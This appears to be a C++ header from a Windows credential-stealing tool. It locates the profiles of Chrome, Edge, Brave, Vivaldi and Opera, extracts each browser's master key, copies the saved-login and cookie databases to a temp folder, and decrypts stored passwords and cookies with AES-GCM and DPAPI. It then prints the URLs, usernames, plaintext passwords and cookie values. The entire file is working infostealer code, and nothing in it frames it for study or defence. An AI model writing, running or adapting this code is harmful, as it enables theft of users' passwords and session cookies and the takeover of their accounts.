#ifndef CHROMIUM_DUMP_H
#define CHROMIUM_DUMP_H

#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <shlobj.h>
#include "sqlite3.h"
#include "CryptoEngine.h"

struct ChromiumBrowserProfile {
    std::wstring name;
    std::wstring relativePath; // np. L"\\Google\\Chrome\\User Data"
};

namespace ChromiumDump {

    inline std::wstring CopyDbToTemp(const std::wstring& dbPath, const std::wstring& tempFileName) {
        WCHAR tempFolder[MAX_PATH];
        GetTempPathW(MAX_PATH, tempFolder);
        std::wstring tempDbPath = std::wstring(tempFolder) + tempFileName;

        DeleteFileW(tempDbPath.c_str());
        if (!CopyFileW(dbPath.c_str(), tempDbPath.c_str(), FALSE)) {
            return L"";
        }
        return tempDbPath;
    }

    inline void DumpPasswords(const std::wstring& profilePath, const std::vector<BYTE>& masterKey) {
        std::wstring dbPath = profilePath + L"\\Default\\Login Data";
        std::wstring tempDbPath = CopyDbToTemp(dbPath, L"Temp_LoginData.db");
        if (tempDbPath.empty()) return;

        sqlite3* db;
        if (sqlite3_open16(tempDbPath.c_str(), &db) != SQLITE_OK) {
            DeleteFileW(tempDbPath.c_str());
            return;
        }

        const char* sql = "SELECT origin_url, username_value, password_value FROM logins;";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const unsigned char* url = sqlite3_column_text(stmt, 0);
                const unsigned char* user = sqlite3_column_text(stmt, 1);
                const BYTE* blobData = static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2));
                int blobSize = sqlite3_column_bytes(stmt, 2);

                std::string password = "";
                if (blobData && blobSize > 31 && blobData[0] == 'v' && blobData[1] == '1') {
                    password = CryptoEngine::DecryptAESGCM(blobData + 15, blobSize - 15 - 16, blobData + 3, blobData + (blobSize - 16), masterKey);
                }

                if (!password.empty()) {
                    std::cout << "  [PASS] URL: " << (url ? (const char*)url : "") << " | User: " << (user ? (const char*)user : "") << " | Pass: " << password << "\n";
                }
            }
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileW(tempDbPath.c_str());
    }

    inline void DumpCookies(const std::wstring& profilePath, const std::vector<BYTE>& masterKey) {
        std::wstring dbPath = profilePath + L"\\Default\\Network\\Cookies";
        std::wstring tempDbPath = CopyDbToTemp(dbPath, L"Temp_Cookies.db");
        if (tempDbPath.empty()) return;

        sqlite3* db;
        if (sqlite3_open16(tempDbPath.c_str(), &db) != SQLITE_OK) {
            DeleteFileW(tempDbPath.c_str());
            return;
        }

        const char* sql = "SELECT host_key, name, encrypted_value FROM cookies;";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const unsigned char* host = sqlite3_column_text(stmt, 0);
                const unsigned char* name = sqlite3_column_text(stmt, 1);
                const BYTE* blobData = static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2));
                int blobSize = sqlite3_column_bytes(stmt, 2);

                std::string cookieVal = "";
                if (blobData && blobSize > 31 && blobData[0] == 'v' && blobData[1] == '1') {
                    cookieVal = CryptoEngine::DecryptAESGCM(blobData + 15, blobSize - 15 - 16, blobData + 3, blobData + (blobSize - 16), masterKey);
                } else if (blobData && blobSize > 0) {
                    std::vector<BYTE> encrypted(blobData, blobData + blobSize);
                    cookieVal = CryptoEngine::DecryptDPAPI(encrypted);
                }

                if (!cookieVal.empty()) {
                    std::cout << "  [COOKIE] Host: " << (host ? (const char*)host : "") << " | Name: " << (name ? (const char*)name : "") << " | Val: " << cookieVal << "\n";
                }
            }
        }
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileW(tempDbPath.c_str());
    }

    inline void Run() {
        wchar_t localAppData[MAX_PATH];
        if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0) return;

        std::vector<ChromiumBrowserProfile> browsers = {
            { L"Google Chrome", L"\\Google\\Chrome\\User Data" },
            { L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data" },
            { L"Brave Browser", L"\\BraveSoftware\\Brave-Browser\\User Data" },
            { L"Vivaldi", L"\\Vivaldi\\User Data" },
            { L"Opera", L"\\Opera Software\\Opera Stable" }
        };

        std::cout << "=== Chromium Browsers (Passwords and Cookies) ===\n";

        for (const auto& browser : browsers) {
            std::wstring basePath = std::wstring(localAppData) + browser.relativePath;
            std::wstring localStatePath = basePath + L"\\Local State";

            std::vector<BYTE> masterKey;
            if (CryptoEngine::GetChromiumMasterKey(localStatePath, masterKey)) {
                std::wcout << L"\n[+] Processing: " << browser.name << L"\n";
                DumpPasswords(basePath, masterKey);
                DumpCookies(basePath, masterKey);
            }
        }
    }
}

#endif